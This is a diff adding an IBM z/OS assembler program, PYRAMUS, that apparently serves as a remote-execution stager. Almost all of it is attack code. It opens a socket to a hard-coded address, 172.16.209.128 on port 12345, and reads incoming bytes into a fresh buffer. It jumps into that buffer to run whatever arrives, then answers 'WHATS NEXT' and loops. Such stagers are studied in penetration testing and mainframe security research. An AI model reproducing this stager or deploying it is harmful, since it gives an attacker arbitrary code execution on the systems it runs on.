@@ -1,0 +1,182 @@
+PYRAMUS   CSECT
+PYRAMUS   AMODE 31
+PYRAMUS   RMODE ANY
+*
+* PREFIX TO SIMULATE R14 BRANCH
+*
+         LR    R14,R15
+         LA    R14,16(R14)
+         BC    15,0(,R14)
+         NOPR  0
+EYE4     DC    XL4'CAFEBABE'
+         USING *,R12
+         USING SOCVAR,R13
+COPY     LR    R12,R14
+*
+* LOAD FUNCS
+*
+         LA    R8,4
+         MVC   BSOCA,BSOC
+         MVC   BCONA,BCON
+         MVC   BREDA,BRED
+         MVC   BWRTA,BWRT
+         LA    0,BSOCA          # load string of func name
+LOOPFUN  LR    R6,R0
+         XR    R1,R1           # clear R1
+         SVC   8               # perform LOAD
+         ST    R0,0(R6)
+         LA    R0,8(R6)
+         BCT   R8,LOOPFUN
+* 
+* GETMAIN BUFFER
+*
+         GETMAIN EC,LV=4096,A=BUFFADDR
+***********************************************************************
+*                                                                     *
+*        BPX1SOC set up socket - inline                               *
+*                                                                     *
+***********************************************************************
+LSOCK    L     R15,BSOCA         # load func addr to 15
+         LA    R1,AARG1
+         LA    R6,TWO
+         ST    R6,AARG1
+         LA    R6,ONE
+         ST    R6,AARG2
+         LA    R6,ZEROS
+         ST    R6,AARG3
+         LA    R6,ONE
+         ST    R6,AARG4
+         LA    R6,CLIF
+         ST    R6,AARG5
+         LA    R6,RET
+         ST    R6,AARG6
+         ST    R6,AARG7
+         XILF  R6,X'80000000'
+         ST    R6,AARG8
+         BALR  R14,R15
+***********************************************************************
+*                                                                     *
+*        BPX1CON (connect) connect to remote host - inline            *
+*                                                                     *
+***********************************************************************
+LCONN    L     R15,BCONA                     # load func addr to 15
+         LA    R1,AARG1
+         L     R6,AARG5
+         ST    R6,AARG1
+         LA    R6,SOCKLEN
+         ST    R6,AARG2
+         LA    R6,SRVSKT
+         ST    R6,AARG3
+         LA    R6,RET
+         ST    R6,AARG4
+         ST    R6,AARG5
+         XILF  R6,X'80000000'
+         ST    R6,AARG6
+         BALR  R14,R15
+***********************************************************************
+*                                                                     *
+*        BPX1WRT (connect) Write to a file or a socket                *
+*                                                                     *
+***********************************************************************
+LWRT     L     R15,BWRTA
+         LA    R1,AARG1
+         LA    R6,RESPONSE
+         ST    R6,RESPADDR
+         LA    R6,RESPADDR
+         ST    R6,AARG2
+         LA    R6,ZEROS
+         ST    R6,AARG3
+         LA    R6,RESPLEN
+         ST    R6,AARG4   
+         LA    R6,RET
+         ST    R6,AARG5
+         ST    R6,AARG6
+         XILF  R6,X'80000000'
+         ST    R6,AARG7      
+         BALR  R14,R15
+***********************************************************************
+*                                                                     *
+*        BPX1RED (connect) Read from a file or socket                 *
+*                                                                     *
+***********************************************************************
+LREAD    L     R15,BREDA                      # load func addr to 15
+         LA    R1,AARG1
+         LA    R6,BUFFADDR
+         ST    R6,AARG2
+         LA    R6,BUFFLEN
+         ST    R6,AARG4
+         BALR  R14,R15
+         L     R15,BUFFADDR
+         BALR  R14,R15
+         B     LWRT
+         SVC   03
+*************************
+* Function addresses    *
+*************************
+         DS    0F
+BUFFADDR DS    XL4
+BSOC     DC    CL8'BPX1SOC '    # Socket
+BCON     DC    CL8'BPX1CON '    # Connect
+BRED     DC    CL8'BPX1RED '    # Read
+BWRT     DC    CL8'BPX1WRT '    # Write
+TWO      DC    XL4'00000002'
+ONE      DC    XL4'00000001'
+SOCKLEN  DC    XL4'00000010'
+SRVSKT   DS    0XL16
+SRVSKTH  DC    XL2'0202'
+MYPORT   DC    XL2'3039'        # port 12345
+MYIP     DC    XL4'ac10d180'    # address 172.16.209.128
+ZEROS    DC    XL8'0000000000000000'
+BUFFALET DC    XL4'00000000'
+BUFFLEN  DC    XL4'00001000'
+RESPLEN  DC    F'10'
+RESPONSE DC    C'WHATS NEXT'
+EYE1     DC XL4'CAFEBABE'
+*************************
+* SOCKET VARS    *
+*************************
+SOCVAR   DSECT
+BSOCA    DS    XL8
+BCONA    DS    XL8
+BREDA    DS    XL8
+BWRTA    DS    XL8
+*************************
+* BPX1SOC               *
+*************************
+CLIF     DS    XL4
+RET      DS    XL4
+*************************
+* BPX1RED/WRT           *
+*************************
+CLIF2    DS    XL4
+RESPADDR DS    XL4
+*************************
+* ARG POINTERS          *
+*************************
+AARG1    DS XL4
+AARG2    DS XL4
+AARG3    DS XL4
+AARG4    DS XL4
+AARG5    DS XL4
+AARG6    DS XL4
+AARG7    DS XL4
+AARG8    DS XL4
+* Register EQUates
+*
+R0       EQU   0
+R1       EQU   1
+R2       EQU   2
+R3       EQU   3
+R4       EQU   4
+R5       EQU   5
+R6       EQU   6
+R7       EQU   7
+R8       EQU   8
+R9       EQU   9
+R10      EQU   10
+R11      EQU   11
+R12      EQU   12
+R13      EQU   13
+R14      EQU   14
+R15      EQU   15
+         END  PYRAMUS
